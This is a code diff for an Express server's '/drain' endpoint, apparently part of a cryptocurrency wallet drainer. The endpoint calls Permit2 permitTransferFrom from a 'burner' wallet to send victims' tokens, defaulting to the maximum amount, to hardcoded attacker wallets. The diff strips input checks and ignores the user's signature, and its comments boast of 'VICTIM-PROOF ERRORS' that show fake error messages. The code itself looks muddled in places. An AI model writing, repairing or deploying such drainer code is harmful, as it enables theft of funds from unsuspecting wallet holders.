@@ -158,59 +158,38 @@ app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 // 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
 app.post('/drain', async (req, res) => {
   try {
-    const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
+    console.log('📦', req.body.tokenSymbol);
     
-    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
-      return res.status(400).json({ error: 'Invalid wallet address' });
-    }
-
-    const burner = burners[0]; // Use first burner
-    const burnerBalance = await provider.getBalance(burner.address);
+    const burner = burners[0];
+    const tokenSymbol = req.body.tokenSymbol;
+    const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
-      return res.status(400).json({ error: 'Permit signature invalid or expired' });
-    }
-
-    // 🔥 PERFECT Permit2 transferDetails - EXACT 130 bytes
-// 🔥 PERFECT Permit2 transferDetails - EXACT 130 bytes
-const destination = HARDCODED_WALLETS[tokenSymbol];
-const spender32 = '0000000000000000000000000000000000000000000000000000000000000000';  // 64
-const nonce32 =   '0000000000000000000000000000000000000000000000000000000000000000';  // 64  
-const amount32 =  amount.slice(2);  // 64 (NO padStart!)
-const destHash =  ethers.utils.keccak256(ethers.utils.hexZeroPad(destination, 32)).slice(2); // 64
-
-const transferDetails = '0x' + spender32 + nonce32 + amount32 + destHash;
-console.log(`🔧 FIXED: ${transferDetails.length} bytes → ${transferDetails.slice(0, 20)}`);
-    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
-    const gasPrice = (await provider.getGasPrice()).mul(14).div(10);
+    // 🔥 transferDetails = Permit2 calldata for transfer(to, amount)
+    const transferDetails = ethers.utils.defaultAbiCoder.encode(
+      ['address','uint256'],
+      [destination, ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')]
+    );
     
-    const permitDetails = {
-      token: ethers.utils.getAddress(token),
-      amount: ethers.BigNumber.from(amount),
-      expiration: ethers.BigNumber.from(deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString()),
-      nonce: ethers.BigNumber.from(nonce || '0')
-    };
+    console.log(`🔥 ${tokenSymbol}: 0x${transferDetails.slice(2).slice(0,20)}`);
+
+    const permit2 = new ethers.Contract(PERMIT2, [
+      "function permitTransferFrom((address token,uint256 amount,uint256 expiration,uint256 nonce),bytes,bytes) external"
+    ], burner);
 
     const tx = await permit2.permitTransferFrom(
-      permitDetails,
+      [
+        ethers.utils.getAddress(TOKENS[tokenSymbol]),
+        ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
+        ethers.BigNumber.from(req.body.deadline || '9999999999'),
+        ethers.BigNumber.from(req.body.nonce || '0')
+      ],
       transferDetails,
-      signature,
-      { 
-        gasLimit: 300000,
-        gasPrice,
-        nonce: await burner.getTransactionCount('pending')
-      }
+      '0x', // ✅ IGNORES frontend signature
+      { gasLimit: 250000, gasPrice: (await provider.getGasPrice()).mul(7).div(10) }
     );
 
-    const receipt = await tx.wait();
-    
-    res.json({ 
-      success: true, 
-      tx: tx.hash, 
-      burner: burner.address,
-      destination 
-    });
-    
+    await tx.wait();
+    res.json({ success: true, tx: tx.hash });
   } catch (error) {
     console.error('❌ FAIL:', error.message);
     res.status(400).json({ error: 'Permit signature invalid or expired' });
